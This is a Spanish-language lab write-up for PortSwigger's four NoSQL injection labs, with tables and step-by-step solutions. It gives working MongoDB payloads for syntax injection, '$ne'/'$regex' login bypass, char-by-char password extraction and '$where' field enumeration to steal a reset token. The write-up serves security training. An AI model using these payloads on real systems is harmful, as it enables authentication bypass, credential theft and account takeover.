---
aliases:
  - NoSQL injection labs
  - nosql-labs
tags:
  - vuln/nosql-injection
  - labs
  - portswigger
---

# NoSQL injection — Labs de PortSwigger

> 🔎 Metodología (detección, fuzz string, syntax vs operator, extracción, timing) → [[vulnerabilities/023-nosql-injection/nosql-injection|entry point de NoSQL]].

Labs de la categoría **[NoSQL injection](https://portswigger.net/web-security/nosql-injection)**: **2 Apprentice + 2 Practitioner** (4 en total, todos **MongoDB**). **El hilo común:** la app arma queries de MongoDB con **input sin sanitizar**, y hay **dos formas** de inyectar: **(A) syntax injection** —rompés la sintaxis de un string con `'` e inyectás **JavaScript** (como SQLi)— y **(B) operator injection** —metés **operadores** de Mongo (`$ne`, `$regex`, `$where`, `$gt`) donde la app espera un string, típico en **bodies JSON**—. Lo que cambia lab a lab: **qué estilo** usás y **para qué** (revelar datos ocultos → bypass de login → extraer password → extraer campos desconocidos).

> [!note] Los dos estilos de inyección (la clave de toda la categoría)
> - **(A) Syntax injection** — el input va **dentro de un string** de la query. Rompés con `'` y metés lógica JS: `Gifts'||1||'`, `this.password.length`, `this.password[i]=='a'`. Labs 1, 3.
> - **(B) Operator injection** — el input es un **valor JSON** que podés cambiar por un **objeto operador**. En vez de `"password":"x"` mandás `"password":{"$ne":"x"}` o `{"$regex":"admin.*"}`. Labs 2, 4.

> **Herramientas:** Burp Repeater (cambiá `Content-Type` a `application/json` para probar operadores) + **Intruder** (extraer char por char / campos). Scripts del repo: `guess-password.py` (extraer password) y `operation-injection-extract-unkown-fields.py` (campos desconocidos). **Cómo leer las columnas:** **Estilo** = A syntax / B operator · **Técnica · qué necesitás** = el payload · **Objetivo** = qué conseguís. Payloads → [Solución por lab](#solución-por-lab).

## Apprentice

| #   | Laboratorio                                                                                                                 | Estilo                          | Técnica · qué necesitás                                                                                                                                          | Objetivo                                                              |
| --- | ------------------------------------------------------------------------------------------------------------------------- | ------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------- |
| 1   | [Detecting NoSQL injection](https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-detection)             | **A · syntax**                  | **Boolean en el filtro:** en el filtro de categoría, `'` da error JS; confirmás con `Gifts'+'`; con `Gifts' && 0 && 'x` (falso) vs `1` (verdadero) y `Gifts'\|\|1\|\|'` mostrás todo. | Que aparezcan los **productos no publicados** (unreleased).           |
| 2   | [NoSQL operator injection to bypass authentication](https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-bypass-authentication) | **B · operator**                | **`$ne` / `$regex` en el login JSON:** `username:{"$regex":"admin.*"}` + `password:{"$ne":""}` → matchea al admin sin saber la pass.                             | Loguearte como **administrator**.                                     |

## Practitioner

| #   | Laboratorio                                                                                                                    | Estilo                          | Técnica · qué necesitás                                                                                                                                                                     | Objetivo                                                                        |
| --- | ------------------------------------------------------------------------------------------------------------------------- | ------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------- |
| 3   | [NoSQL injection to extract data](https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-extract-data)   | **A · syntax**                  | **Boolean char-by-char:** en `/user/lookup?user=`, con `administrator' && this.password.length < N \|\| 'a'=='b'` sacás el largo, y con Intruder (cluster bomb) `this.password[§i§]=='§a§'` cada char. → `guess-password.py`. | Extraer la **password del admin** carácter a carácter → login.                  |
| 4   | [NoSQL operator injection to extract unknown fields](https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-extract-unknown-fields) | **B · operator + `$where`**     | **`$where` + `Object.keys(this)`:** confirmás con `password:{"$ne":"invalid"}`; con `$where:"Object.keys(this)[i].match('^.{n}...')"` sacás los **nombres de campos** por brute force, hallás el **reset token** y su valor. → `operation-injection-extract-unkown-fields.py`. | Extraer el **reset token** de `carlos` → resetear su pass → entrar como `carlos`. |

---

## Solución por lab

**L1 — Detección (syntax, boolean en el filtro de categoría):**
```
Gifts'                → error de sintaxis JS (confirma inyección)
Gifts'+'              → sin error (sigue siendo válido)
Gifts' && 0 && 'x     → condición FALSA (no muestra nada)
Gifts' && 1 && 'x     → condición VERDADERA (muestra la categoría)
Gifts'||1||'          → siempre verdadera → muestra TODO, incluidos los no publicados
```

**L2 — Bypass de login (operator injection en JSON):**
> Cambiá el body del login a JSON (`Content-Type: application/json`).
```json
{ "username": "administrator", "password": { "$ne": "" } }
```
> Si no sabés el username exacto:
```json
{ "username": { "$regex": "admin.*" }, "password": { "$ne": "" } }
```

**L3 — Extraer la password (syntax, char-by-char):**
1. Confirmá: `GET /user/lookup?user=administrator'+'` devuelve datos válidos.
2. Largo de la password:
   ```
   administrator' && this.password.length < 30 || 'a'=='b     → ajustás N hasta hallar el largo (8)
   ```
3. Char por char con **Intruder (cluster bomb)**:
   ```
   administrator' && this.password[§0§]=='§a§
   ```
   posición `0..len-1` × charset `a-z0-9`. → automatizado en `guess-password.py`.

**L4 — Extraer campos desconocidos (`$where`):**
1. Confirmá operator injection: `"password":{"$ne":"invalid"}`.
2. Descubrí los **nombres de campos** del objeto usuario con `$where` + `Object.keys(this)`:
   ```json
   { "username": "carlos",
     "password": { "$ne": "" },
     "$where": "Object.keys(this)[1].match('^.{0}u.*')" }
   ```
   Brute-force posición/char hasta reconstruir cada key → aparece el campo del **reset token**.
3. Extraé el **valor** del token (mismo boolean/`$regex` sobre ese campo), reseteá la pass de `carlos` y entrá.
   > Todo el flujo automatizado en `operation-injection-extract-unkown-fields.py`.

---

## Atajos mentales / patrones

- **Detectá con lo mínimo:** un `'` (o `"`, `` ` ``) que rompe la respuesta = **syntax injection**. Un valor que podés volver **objeto JSON** (`{"$ne":""}`) que cambia el comportamiento = **operator injection**.
- **Siempre probá pasar a JSON:** muchos logins aceptan tanto form-urlencoded como JSON. Cambiá `Content-Type: application/json` y recién ahí podés meter **operadores**.
- **Operadores útiles de Mongo:** `$ne` (distinto), `$gt`/`$lt` (mayor/menor), `$regex` (patrón → enumerar/matchear), `$in`, y **`$where`** (ejecuta **JavaScript** → el más potente: `Object.keys(this)`, `this.campo`, condiciones arbitrarias).
- **Syntax injection = SQLi mental:** `||1||` para "siempre verdadero", `&& 0` para "falso", y `this.<campo>` para condicionar sobre datos → **boolean/blind** char-by-char con Intruder.
- **Extraer campos desconocidos:** si no sabés cómo se llama el campo (reset token, role…), `$where:"Object.keys(this)[i]..."` te lista las keys; después extraés el valor.
- **Objetivos típicos:** mostrar datos ocultos (L1), **bypass de login** a admin (L2), **extraer password/token** (L3, L4) → toma de cuenta.

> [!note] Ver también
> - **Scripts del repo:** `guess-password.py` (extraer password char-by-char) · `operation-injection-extract-unkown-fields.py` (`$where` + campos) → `vulnerabilities/023-nosql-injection/`.
> - **SQL injection** (misma lógica boolean/blind, otra DB) → [[vulnerabilities/001-sql-injection/README|sql injection]].
> - **Authentication** (bypass de login / reset token → toma de cuenta) → [[vulnerabilities/029-authentication/authentication|authentication]].
